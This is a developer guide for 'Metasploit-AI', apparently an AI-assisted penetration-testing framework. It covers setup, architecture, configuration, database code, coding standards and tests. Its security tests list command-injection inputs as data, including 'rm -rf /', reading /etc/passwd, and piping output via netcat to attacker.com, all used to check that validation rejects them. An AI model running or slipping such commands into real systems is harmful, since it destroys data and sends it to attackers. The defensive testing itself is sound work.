# Development Guide

Comprehensive developer documentation for contributing to and extending the Metasploit-AI framework.

## Table of Contents

1. [Development Environment Setup](#development-environment-setup)
2. [Project Architecture](#project-architecture)
3. [Core Framework Components](#core-framework-components)
4. [Development Workflow](#development-workflow)
5. [Coding Standards](#coding-standards)
6. [Testing Guidelines](#testing-guidelines)
7. [AI Model Development](#ai-model-development)
8. [Module Development](#module-development)
9. [API Development](#api-development)
10. [Database Schema](#database-schema)
11. [Build and Deployment](#build-and-deployment)
12. [Debugging and Profiling](#debugging-and-profiling)

## Development Environment Setup

### Prerequisites

**Required Software:**
```bash
# Python 3.9+ with pip
python3 --version  # Should be 3.9+
pip3 --version

# Git for version control
git --version

# Node.js for web interface development
node --version  # Should be 14+
npm --version

# Docker for containerized development
docker --version
docker-compose --version

# PostgreSQL for database
psql --version
```

### Setting Up Development Environment

**Clone and Setup:**
```bash
# Clone the repository
git clone https://github.com/yashab-cyber/metasploit-ai.git
cd metasploit-ai

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate     # Windows

# Install dependencies
pip install -r requirements-dev.txt
pip install -e .

# Setup pre-commit hooks
pre-commit install

# Initialize database
python scripts/init_db.py

# Run system check
python scripts/system_check.py
```

**IDE Configuration:**

**VS Code Setup (recommended):**
```json
// .vscode/settings.json
{
    "python.defaultInterpreterPath": "./venv/bin/python",
    "python.linting.enabled": true,
    "python.linting.pylintEnabled": false,
    "python.linting.flake8Enabled": true,
    "python.formatting.provider": "black",
    "python.testing.pytestEnabled": true,
    "python.testing.pytestArgs": ["tests/"],
    "editor.formatOnSave": true,
    "editor.codeActionsOnSave": {
        "source.organizeImports": true
    }
}
```

**PyCharm Configuration:**
- Set interpreter to `./venv/bin/python`
- Configure Black as code formatter
- Enable pytest as test runner
- Install Metasploit-AI plugin (if available)

### Environment Variables

**Required Environment Variables:**
```bash
# .env file
export METASPLOIT_AI_ENV=development
export METASPLOIT_AI_DEBUG=true
export METASPLOIT_AI_LOG_LEVEL=DEBUG

# Database Configuration
export DB_HOST=localhost
export DB_PORT=5432
export DB_NAME=metasploit_ai_dev
export DB_USER=dev_user
export DB_PASSWORD=dev_password

# AI Models
export AI_MODEL_PATH=./models
export TENSORFLOW_GPU_MEMORY_GROWTH=true

# Metasploit Integration
export METASPLOIT_HOST=localhost
export METASPLOIT_PORT=55553
export METASPLOIT_USERNAME=msf
export METASPLOIT_PASSWORD=msf_password

# Security Keys
export SECRET_KEY=your-secret-key-for-development
export JWT_SECRET=your-jwt-secret-for-development
```

## Project Architecture

### High-Level Architecture

```
┌─────────────────────────────────────────────────┐
│                 User Interfaces                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────── │
│  │ Web UI      │  │ CLI         │  │ REST API   │
│  │ (Flask)     │  │ (Click)     │  │ (FastAPI)  │
│  └─────────────┘  └─────────────┘  └─────────── │
└─────────────┬───────────────────────────────────┘
              │
┌─────────────▼───────────────────────────────────┐
│                Core Framework                   │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────── │
│  │ Scanner     │  │ Exploiter   │  │ AI Engine  │
│  │ Module      │  │ Module      │  │ Module     │
│  └─────────────┘  └─────────────┘  └─────────── │
└─────────────┬───────────────────────────────────┘
              │
┌─────────────▼───────────────────────────────────┐
│                Infrastructure                   │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────── │
│  │ Database    │  │ Message     │  │ File       │
│  │ (PostgreSQL)│  │ Queue       │  │ Storage    │
│  └─────────────┘  └─────────────┘  └─────────── │
└─────────────────────────────────────────────────┘
```

### Directory Structure

```
metasploit-ai/
├── src/                        # Main source code
│   ├── __init__.py
│   ├── core/                   # Core framework components
│   │   ├── __init__.py
│   │   ├── framework.py        # Main framework class
│   │   ├── config.py          # Configuration management
│   │   ├── database.py        # Database abstraction
│   │   └── metasploit_client.py # Metasploit RPC client
│   ├── ai/                    # AI/ML components
│   │   ├── __init__.py
│   │   ├── vulnerability_analyzer.py
│   │   ├── exploit_recommender.py
│   │   └── payload_generator.py
│   ├── modules/               # Scanning and exploitation modules
│   │   ├── __init__.py
│   │   └── scanner.py
│   ├── cli/                   # Command-line interface
│   │   ├── __init__.py
│   │   └── interface.py
│   ├── web/                   # Web interface
│   │   ├── __init__.py
│   │   ├── app.py
│   │   ├── api/               # REST API endpoints
│   │   ├── templates/         # HTML templates
│   │   └── static/            # CSS, JS, images
│   └── utils/                 # Utility functions
│       ├── __init__.py
│       └── logger.py
├── tests/                     # Test suite
│   ├── __init__.py
│   ├── conftest.py           # Pytest configuration
│   ├── unit/                 # Unit tests
│   ├── integration/          # Integration tests
│   └── fixtures/             # Test data
├── docs/                     # Documentation
├── config/                   # Configuration files
├── scripts/                  # Utility scripts
├── models/                   # AI model files
├── data/                     # Data files
└── docker/                   # Docker configurations
```

### Component Interactions

```python
# Framework initialization flow
from src.core.framework import MetasploitAI
from src.core.config import Config
from src.core.database import Database

# 1. Load configuration
config = Config.load('config/default.yaml')

# 2. Initialize database
db = Database(config.database)
db.connect()

# 3. Initialize framework
framework = MetasploitAI(config, db)

# 4. Load AI models
framework.ai.load_models()

# 5. Connect to Metasploit
framework.metasploit.connect()

# 6. Ready for operations
framework.start()
```

## Core Framework Components

### Framework Class Structure

```python
# src/core/framework.py
from typing import Optional, Dict, Any, List
import logging
from dataclasses import dataclass
from .config import Config
from .database import Database
from .metasploit_client import MetasploitClient
from ..ai import AIEngine
from ..modules import ModuleManager

@dataclass
class FrameworkState:
    """Framework operational state."""
    initialized: bool = False
    connected: bool = False
    ai_loaded: bool = False
    modules_loaded: bool = False

class MetasploitAI:
    """Main framework class for Metasploit-AI."""
    
    def __init__(self, config: Config, database: Database):
        """Initialize the framework with configuration and database."""
        self.config = config
        self.database = database
        self.state = FrameworkState()
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Initialize core components
        self.metasploit = MetasploitClient(config.metasploit)
        self.ai = AIEngine(config.ai)
        self.modules = ModuleManager(config.modules)
        
        # Event system
        self._event_handlers: Dict[str, List[callable]] = {}
        
    def initialize(self) -> bool:
        """Initialize all framework components."""
        try:
            # Initialize database
            self.database.initialize()
            
            # Load AI models
            self.ai.load_models()
            self.state.ai_loaded = True
            
            # Load modules
            self.modules.load_all()
            self.state.modules_loaded = True
            
            self.state.initialized = True
            self.emit_event('framework_initialized')
            
            return True
            
        except Exception as e:
            self.logger.error(f"Framework initialization failed: {e}")
            return False
    
    def connect(self) -> bool:
        """Connect to external services."""
        try:
            # Connect to Metasploit
            if not self.metasploit.connect():
                raise ConnectionError("Failed to connect to Metasploit")
            
            self.state.connected = True
            self.emit_event('framework_connected')
            
            return True
            
        except Exception as e:
            self.logger.error(f"Framework connection failed: {e}")
            return False
    
    def scan_target(self, target: str, scan_type: str = 'comprehensive') -> Dict[str, Any]:
        """Scan a target for vulnerabilities."""
        if not self.state.initialized:
            raise RuntimeError("Framework not initialized")
        
        # Get appropriate scanner module
        scanner = self.modules.get_scanner(scan_type)
        
        # Execute scan
        results = scanner.scan(target)
        
        # Store results in database
        scan_id = self.database.store_scan_results(target, results)
        
        # Trigger AI analysis
        ai_analysis = self.ai.analyze_vulnerabilities(results)
        self.database.store_ai_analysis(scan_id, ai_analysis)
        
        self.emit_event('scan_completed', {
            'target': target,
            'scan_id': scan_id,
            'results': results
        })
        
        return {
            'scan_id': scan_id,
            'results': results,
            'ai_analysis': ai_analysis
        }
    
    def exploit_target(self, target: str, exploit_name: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Exploit a target using specified exploit."""
        if not self.state.connected:
            raise RuntimeError("Not connected to Metasploit")
        
        # Get exploit module
        exploit = self.metasploit.get_exploit(exploit_name)
        
        # Configure exploit
        if options:
            exploit.configure(options)
        
        # Execute exploit
        session = exploit.execute(target)
        
        # Store session information
        session_id = self.database.store_session(session)
        
        self.emit_event('exploitation_completed', {
            'target': target,
            'exploit': exploit_name,
            'session_id': session_id
        })
        
        return {
            'session_id': session_id,
            'session': session
        }
    
    def on(self, event: str, handler: callable) -> None:
        """Register event handler."""
        if event not in self._event_handlers:
            self._event_handlers[event] = []
        self._event_handlers[event].append(handler)
    
    def emit_event(self, event: str, data: Any = None) -> None:
        """Emit an event to all registered handlers."""
        if event in self._event_handlers:
            for handler in self._event_handlers[event]:
                try:
                    handler(data)
                except Exception as e:
                    self.logger.error(f"Event handler failed: {e}")
    
    def shutdown(self) -> None:
        """Gracefully shutdown the framework."""
        self.emit_event('framework_shutting_down')
        
        # Disconnect from Metasploit
        if self.state.connected:
            self.metasploit.disconnect()
        
        # Close database connections
        self.database.close()
        
        self.logger.info("Framework shutdown complete")
```

### Configuration Management

```python
# src/core/config.py
from typing import Dict, Any, Optional
import yaml
import os
from pathlib import Path
from dataclasses import dataclass

@dataclass
class DatabaseConfig:
    """Database configuration."""
    host: str = 'localhost'
    port: int = 5432
    name: str = 'metasploit_ai'
    user: str = 'postgres'
    password: str = ''
    ssl_mode: str = 'prefer'

@dataclass
class MetasploitConfig:
    """Metasploit RPC configuration."""
    host: str = 'localhost'
    port: int = 55553
    username: str = 'msf'
    password: str = 'msf'
    ssl: bool = False
    timeout: int = 30

@dataclass
class AIConfig:
    """AI/ML configuration."""
    model_path: str = './models'
    gpu_enabled: bool = True
    batch_size: int = 32
    confidence_threshold: float = 0.8

class Config:
    """Configuration management class."""
    
    def __init__(self, config_dict: Dict[str, Any]):
        """Initialize configuration from dictionary."""
        self._config = config_dict
        
        # Parse configuration sections
        self.database = DatabaseConfig(**config_dict.get('database', {}))
        self.metasploit = MetasploitConfig(**config_dict.get('metasploit', {}))
        self.ai = AIConfig(**config_dict.get('ai', {}))
        
        # General settings
        self.debug = config_dict.get('debug', False)
        self.log_level = config_dict.get('log_level', 'INFO')
        self.max_threads = config_dict.get('max_threads', 50)
    
    @classmethod
    def load(cls, config_path: str) -> 'Config':
        """Load configuration from YAML file."""
        config_file = Path(config_path)
        
        if not config_file.exists():
            raise FileNotFoundError(f"Configuration file not found: {config_path}")
        
        with open(config_file, 'r') as f:
            config_dict = yaml.safe_load(f)
        
        # Override with environment variables
        config_dict = cls._apply_env_overrides(config_dict)
        
        return cls(config_dict)
    
    @staticmethod
    def _apply_env_overrides(config: Dict[str, Any]) -> Dict[str, Any]:
        """Apply environment variable overrides."""
        env_mappings = {
            'METASPLOIT_AI_DEBUG': ('debug', bool),
            'METASPLOIT_AI_LOG_LEVEL': ('log_level', str),
            'DB_HOST': ('database.host', str),
            'DB_PORT': ('database.port', int),
            'DB_NAME': ('database.name', str),
            'DB_USER': ('database.user', str),
            'DB_PASSWORD': ('database.password', str),
            'METASPLOIT_HOST': ('metasploit.host', str),
            'METASPLOIT_PORT': ('metasploit.port', int),
            'METASPLOIT_USERNAME': ('metasploit.username', str),
            'METASPLOIT_PASSWORD': ('metasploit.password', str),
        }
        
        for env_var, (config_path, type_func) in env_mappings.items():
            value = os.getenv(env_var)
            if value is not None:
                # Convert value to appropriate type
                if type_func == bool:
                    value = value.lower() in ('true', '1', 'yes')
                elif type_func == int:
                    value = int(value)
                
                # Set nested configuration value
                keys = config_path.split('.')
                current = config
                for key in keys[:-1]:
                    if key not in current:
                        current[key] = {}
                    current = current[key]
                current[keys[-1]] = value
        
        return config
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value by key."""
        keys = key.split('.')
        current = self._config
        
        for k in keys:
            if isinstance(current, dict) and k in current:
                current = current[k]
            else:
                return default
        
        return current
    
    def set(self, key: str, value: Any) -> None:
        """Set configuration value by key."""
        keys = key.split('.')
        current = self._config
        
        for k in keys[:-1]:
            if k not in current:
                current[k] = {}
            current = current[k]
        
        current[keys[-1]] = value
```

### Database Layer

```python
# src/core/database.py
from typing import List, Dict, Any, Optional, Tuple
import logging
import psycopg2
from psycopg2.extras import RealDictCursor
from contextlib import contextmanager
from datetime import datetime
import json

class Database:
    """Database abstraction layer for Metasploit-AI."""
    
    def __init__(self, config):
        """Initialize database connection."""
        self.config = config
        self.logger = logging.getLogger(__name__)
        self._connection = None
    
    def connect(self) -> bool:
        """Establish database connection."""
        try:
            self._connection = psycopg2.connect(
                host=self.config.host,
                port=self.config.port,
                database=self.config.name,
                user=self.config.user,
                password=self.config.password,
                sslmode=self.config.ssl_mode
            )
            self.logger.info("Database connection established")
            return True
            
        except Exception as e:
            self.logger.error(f"Database connection failed: {e}")
            return False
    
    def initialize(self) -> None:
        """Initialize database schema."""
        if not self._connection:
            self.connect()
        
        schema_sql = """
        -- Targets table
        CREATE TABLE IF NOT EXISTS targets (
            id SERIAL PRIMARY KEY,
            ip_address INET NOT NULL UNIQUE,
            hostname VARCHAR(255),
            os_type VARCHAR(50),
            status VARCHAR(20) DEFAULT 'unknown',
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            metadata JSONB
        );
        
        -- Scans table
        CREATE TABLE IF NOT EXISTS scans (
            id SERIAL PRIMARY KEY,
            target_id INTEGER REFERENCES targets(id),
            scan_type VARCHAR(50) NOT NULL,
            status VARCHAR(20) DEFAULT 'pending',
            started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            completed_at TIMESTAMP,
            results JSONB,
            metadata JSONB
        );
        
        -- Vulnerabilities table
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id SERIAL PRIMARY KEY,
            target_id INTEGER REFERENCES targets(id),
            scan_id INTEGER REFERENCES scans(id),
            cve_id VARCHAR(20),
            title VARCHAR(255) NOT NULL,
            description TEXT,
            severity VARCHAR(20),
            cvss_score DECIMAL(3,1),
            exploit_available BOOLEAN DEFAULT FALSE,
            discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            metadata JSONB
        );
        
        -- Sessions table
        CREATE TABLE IF NOT EXISTS sessions (
            id SERIAL PRIMARY KEY,
            target_id INTEGER REFERENCES targets(id),
            session_type VARCHAR(50),
            user_context VARCHAR(100),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status VARCHAR(20) DEFAULT 'active',
            metadata JSONB
        );
        
        -- AI Analysis table
        CREATE TABLE IF NOT EXISTS ai_analysis (
            id SERIAL PRIMARY KEY,
            scan_id INTEGER REFERENCES scans(id),
            analysis_type VARCHAR(50),
            confidence DECIMAL(3,2),
            results JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
        
        -- Create indexes for performance
        CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip_address);
        CREATE INDEX IF NOT EXISTS idx_scans_target ON scans(target_id);
        CREATE INDEX IF NOT EXISTS idx_vulns_target ON vulnerabilities(target_id);
        CREATE INDEX IF NOT EXISTS idx_vulns_severity ON vulnerabilities(severity);
        CREATE INDEX IF NOT EXISTS idx_sessions_target ON sessions(target_id);
        """
        
        with self.cursor() as cur:
            cur.execute(schema_sql)
        
        self.logger.info("Database schema initialized")
    
    @contextmanager
    def cursor(self):
        """Context manager for database cursors."""
        if not self._connection:
            self.connect()
        
        cur = self._connection.cursor(cursor_factory=RealDictCursor)
        try:
            yield cur
            self._connection.commit()
        except Exception:
            self._connection.rollback()
            raise
        finally:
            cur.close()
    
    def store_target(self, ip_address: str, **kwargs) -> int:
        """Store target information and return target ID."""
        with self.cursor() as cur:
            cur.execute("""
                INSERT INTO targets (ip_address, hostname, os_type, metadata)
                VALUES (%(ip)s, %(hostname)s, %(os_type)s, %(metadata)s)
                ON CONFLICT (ip_address) 
                DO UPDATE SET 
                    hostname = COALESCE(EXCLUDED.hostname, targets.hostname),
                    os_type = COALESCE(EXCLUDED.os_type, targets.os_type),
                    last_seen = CURRENT_TIMESTAMP,
                    metadata = targets.metadata || EXCLUDED.metadata
                RETURNING id
            """, {
                'ip': ip_address,
                'hostname': kwargs.get('hostname'),
                'os_type': kwargs.get('os_type'),
                'metadata': json.dumps(kwargs.get('metadata', {}))
            })
            
            return cur.fetchone()['id']
    
    def store_scan_results(self, target: str, results: Dict[str, Any]) -> int:
        """Store scan results and return scan ID."""
        # Get or create target
        target_id = self.store_target(target)
        
        with self.cursor() as cur:
            cur.execute("""
                INSERT INTO scans (target_id, scan_type, status, results)
                VALUES (%(target_id)s, %(scan_type)s, 'completed', %(results)s)
                RETURNING id
            """, {
                'target_id': target_id,
                'scan_type': results.get('scan_type', 'unknown'),
                'results': json.dumps(results)
            })
            
            return cur.fetchone()['id']
    
    def store_vulnerability(self, target_id: int, scan_id: int, vuln_data: Dict[str, Any]) -> int:
        """Store vulnerability information."""
        with self.cursor() as cur:
            cur.execute("""
                INSERT INTO vulnerabilities 
                (target_id, scan_id, cve_id, title, description, severity, cvss_score, metadata)
                VALUES (%(target_id)s, %(scan_id)s, %(cve_id)s, %(title)s, 
                        %(description)s, %(severity)s, %(cvss_score)s, %(metadata)s)
                RETURNING id
            """, {
                'target_id': target_id,
                'scan_id': scan_id,
                'cve_id': vuln_data.get('cve_id'),
                'title': vuln_data['title'],
                'description': vuln_data.get('description'),
                'severity': vuln_data.get('severity'),
                'cvss_score': vuln_data.get('cvss_score'),
                'metadata': json.dumps(vuln_data.get('metadata', {}))
            })
            
            return cur.fetchone()['id']
    
    def get_targets(self, filters: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Retrieve targets with optional filtering."""
        query = "SELECT * FROM targets"
        params = {}
        
        if filters:
            conditions = []
            if 'status' in filters:
                conditions.append("status = %(status)s")
                params['status'] = filters['status']
            if 'os_type' in filters:
                conditions.append("os_type = %(os_type)s")
                params['os_type'] = filters['os_type']
            
            if conditions:
                query += " WHERE " + " AND ".join(conditions)
        
        query += " ORDER BY last_seen DESC"
        
        with self.cursor() as cur:
            cur.execute(query, params)
            return [dict(row) for row in cur.fetchall()]
    
    def get_vulnerabilities(self, target_id: int = None) -> List[Dict[str, Any]]:
        """Retrieve vulnerabilities for a target or all targets."""
        query = """
            SELECT v.*, t.ip_address, t.hostname
            FROM vulnerabilities v
            JOIN targets t ON v.target_id = t.id
        """
        params = {}
        
        if target_id:
            query += " WHERE v.target_id = %(target_id)s"
            params['target_id'] = target_id
        
        query += " ORDER BY v.discovered_at DESC"
        
        with self.cursor() as cur:
            cur.execute(query, params)
            return [dict(row) for row in cur.fetchall()]
    
    def close(self) -> None:
        """Close database connection."""
        if self._connection:
            self._connection.close()
            self.logger.info("Database connection closed")
```

## Development Workflow

### Git Workflow

**Branch Naming Convention:**
```bash
# Feature branches
feature/vulnerability-scanner-enhancement
feature/ai-model-optimization

# Bug fix branches
bugfix/session-timeout-issue
bugfix/sql-injection-vulnerability

# Hotfix branches
hotfix/critical-security-patch

# Release branches
release/v1.1.0
```

**Commit Message Format:**
```
type(scope): brief description

Detailed explanation of the change (optional)

- Key point 1
- Key point 2

Fixes: #123
Co-authored-by: Name <email@example.com>
```

**Types:**
- `feat`: New feature
- `fix`: Bug fix
- `docs`: Documentation changes
- `style`: Code style changes
- `refactor`: Code refactoring
- `test`: Test additions/modifications
- `chore`: Maintenance tasks

### Development Process

**1. Feature Development:**
```bash
# Create feature branch
git checkout -b feature/new-exploit-module

# Make changes and commit regularly
git add .
git commit -m "feat(exploits): add new web application exploit module"

# Keep branch updated
git rebase main

# Push and create pull request
git push origin feature/new-exploit-module
```

**2. Code Review Process:**
- All code must be reviewed before merging
- Automated tests must pass
- Security review required for security-related changes
- Documentation must be updated

**3. Testing Requirements:**
- Unit tests for all new functionality
- Integration tests for component interactions
- Security tests for vulnerability-related code
- Performance tests for AI model changes

## Coding Standards

### Python Code Style

**Follow PEP 8 with extensions:**
```python
# Good: Type hints for all functions
def analyze_vulnerability(cve_data: Dict[str, Any]) -> VulnerabilityAnalysis:
    """Analyze vulnerability data using AI models.
    
    Args:
        cve_data: Dictionary containing CVE information
        
    Returns:
        VulnerabilityAnalysis object with risk assessment
        
    Raises:
        ValueError: If CVE data is invalid
    """
    if not cve_data or 'cve_id' not in cve_data:
        raise ValueError("Invalid CVE data provided")
    
    # Implementation here
    pass

# Good: Descriptive variable names
vulnerability_score = calculate_risk_score(cve_data)
exploitation_probability = model.predict(features)

# Good: Constants
DEFAULT_SCAN_TIMEOUT = 300
MAX_CONCURRENT_EXPLOITS = 10
AI_CONFIDENCE_THRESHOLD = 0.85
```

**Error Handling:**
```python
# Good: Specific exception handling
try:
    result = risky_operation()
except MetasploitConnectionError as e:
    logger.error(f"Metasploit connection failed: {e}")
    raise FrameworkError("Unable to connect to Metasploit") from e
except VulnerabilityAnalysisError as e:
    logger.warning(f"AI analysis failed: {e}")
    return default_analysis()
except Exception as e:
    logger.exception("Unexpected error in vulnerability analysis")
    raise

# Good: Custom exceptions
class MetasploitAIError(Exception):
    """Base exception for Metasploit-AI framework."""
    pass

class VulnerabilityAnalysisError(MetasploitAIError):
    """Exception raised during vulnerability analysis."""
    pass

class ExploitExecutionError(MetasploitAIError):
    """Exception raised during exploit execution."""
    pass
```

### Security Considerations

**Input Validation:**
```python
import ipaddress
import re
from typing import Union

def validate_target(target: str) -> str:
    """Validate and normalize target input."""
    target = target.strip()
    
    # Check for IP address
    try:
        ipaddress.ip_address(target)
        return target
    except ValueError:
        pass
    
    # Check for CIDR notation
    try:
        ipaddress.ip_network(target, strict=False)
        return target
    except ValueError:
        pass
    
    # Check for hostname
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$'
    if re.match(hostname_pattern, target) and len(target) <= 253:
        return target
    
    raise ValueError(f"Invalid target format: {target}")

def sanitize_command(command: str) -> str:
    """Sanitize command input to prevent injection."""
    # Remove dangerous characters
    dangerous_chars = [';', '&', '|', '>', '<', '`', '$', '(', ')']
    for char in dangerous_chars:
        if char in command:
            raise ValueError(f"Dangerous character '{char}' in command")
    
    return command.strip()
```

**Authentication and Authorization:**
```python
from functools import wraps
import jwt
from datetime import datetime, timedelta

def require_auth(func):
    """Decorator to require authentication."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        token = get_auth_token()
        if not token or not verify_token(token):
            raise AuthenticationError("Invalid or missing authentication token")
        return func(*args, **kwargs)
    return wrapper

def require_permission(permission: str):
    """Decorator to require specific permission."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            user = get_current_user()
            if not user.has_permission(permission):
                raise AuthorizationError(f"Permission '{permission}' required")
            return func(*args, **kwargs)
        return wrapper
    return decorator

# Usage
@require_auth
@require_permission('exploit_execute')
def execute_exploit(target: str, exploit_name: str) -> Dict[str, Any]:
    """Execute exploit against target."""
    pass
```

## Testing Guidelines

### Unit Testing

**Test Structure:**
```python
# tests/unit/test_vulnerability_analyzer.py
import pytest
from unittest.mock import Mock, patch
from src.ai.vulnerability_analyzer import VulnerabilityAnalyzer
from src.core.config import Config

class TestVulnerabilityAnalyzer:
    """Unit tests for VulnerabilityAnalyzer."""
    
    @pytest.fixture
    def analyzer(self):
        """Create analyzer instance for testing."""
        config = Config({'ai': {'model_path': './test_models'}})
        return VulnerabilityAnalyzer(config)
    
    @pytest.fixture
    def sample_cve_data(self):
        """Sample CVE data for testing."""
        return {
            'cve_id': 'CVE-2021-34527',
            'description': 'Windows Print Spooler Remote Code Execution',
            'cvss_score': 8.8,
            'severity': 'high'
        }
    
    def test_analyze_vulnerability_success(self, analyzer, sample_cve_data):
        """Test successful vulnerability analysis."""
        with patch.object(analyzer, '_load_model') as mock_load:
            mock_model = Mock()
            mock_model.predict.return_value = [0.95]
            mock_load.return_value = mock_model
            
            result = analyzer.analyze(sample_cve_data)
            
            assert result.confidence > 0.9
            assert result.risk_level == 'high'
            assert result.exploitability > 0.8
    
    def test_analyze_vulnerability_invalid_data(self, analyzer):
        """Test analysis with invalid data."""
        with pytest.raises(ValueError, match="Invalid CVE data"):
            analyzer.analyze({})
    
    def test_analyze_vulnerability_model_error(self, analyzer, sample_cve_data):
        """Test handling of model errors."""
        with patch.object(analyzer, '_load_model') as mock_load:
            mock_load.side_effect = Exception("Model loading failed")
            
            with pytest.raises(VulnerabilityAnalysisError):
                analyzer.analyze(sample_cve_data)
    
    @pytest.mark.parametrize("cvss_score,expected_risk", [
        (9.5, 'critical'),
        (7.5, 'high'),
        (5.5, 'medium'),
        (2.5, 'low')
    ])
    def test_risk_level_calculation(self, analyzer, cvss_score, expected_risk):
        """Test risk level calculation for different CVSS scores."""
        risk_level = analyzer._calculate_risk_level(cvss_score)
        assert risk_level == expected_risk
```

### Integration Testing

**Database Integration Tests:**
```python
# tests/integration/test_database.py
import pytest
import psycopg2
from testcontainers.postgres import PostgresContainer
from src.core.database import Database
from src.core.config import DatabaseConfig

@pytest.fixture(scope="session")
def postgres_container():
    """Start PostgreSQL container for testing."""
    with PostgresContainer("postgres:13") as postgres:
        yield postgres

@pytest.fixture
def test_db(postgres_container):
    """Create test database instance."""
    config = DatabaseConfig(
        host=postgres_container.get_container_host_ip(),
        port=postgres_container.get_exposed_port(5432),
        name=postgres_container.POSTGRES_DB,
        user=postgres_container.POSTGRES_USER,
        password=postgres_container.POSTGRES_PASSWORD
    )
    
    db = Database(config)
    db.connect()
    db.initialize()
    
    yield db
    
    db.close()

class TestDatabaseIntegration:
    """Integration tests for database operations."""
    
    def test_store_and_retrieve_target(self, test_db):
        """Test storing and retrieving target information."""
        # Store target
        target_id = test_db.store_target(
            ip_address='192.168.1.100',
            hostname='test-server',
            os_type='linux'
        )
        
        assert target_id is not None
        
        # Retrieve targets
        targets = test_db.get_targets()
        assert len(targets) == 1
        assert targets[0]['ip_address'] == '192.168.1.100'
        assert targets[0]['hostname'] == 'test-server'
    
    def test_store_scan_results(self, test_db):
        """Test storing scan results."""
        # Store target first
        target_id = test_db.store_target('192.168.1.100')
        
        # Store scan results
        scan_results = {
            'scan_type': 'vulnerability',
            'ports': [22, 80, 443],
            'services': ['ssh', 'http', 'https']
        }
        
        scan_id = test_db.store_scan_results('192.168.1.100', scan_results)
        assert scan_id is not None
```

### Security Testing

**Security Test Examples:**
```python
# tests/security/test_input_validation.py
import pytest
from src.utils.validation import validate_target, sanitize_command

class TestInputValidation:
    """Security tests for input validation."""
    
    @pytest.mark.parametrize("malicious_input", [
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && cat /etc/passwd",
        "192.168.1.1 | nc attacker.com 4444",
        "$(whoami)",
        "`id`",
        "192.168.1.1' OR '1'='1"
    ])
    def test_reject_malicious_targets(self, malicious_input):
        """Test rejection of malicious target inputs."""
        with pytest.raises(ValueError):
            validate_target(malicious_input)
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection."""
        malicious_commands = [
            "ls; rm -rf /",
            "ps && cat /etc/passwd",
            "whoami | nc attacker.com 4444"
        ]
        
        for cmd in malicious_commands:
            with pytest.raises(ValueError):
                sanitize_command(cmd)
```

---

*This development guide is part of the Metasploit-AI documentation suite. For more information, see the [README](../README.md) or visit the [project repository](https://github.com/yashab-cyber/metasploit-ai).*

---

*Created by [Yashab Alam](https://github.com/yashab-cyber) and the [ZehraSec](https://www.zehrasec.com) Team*
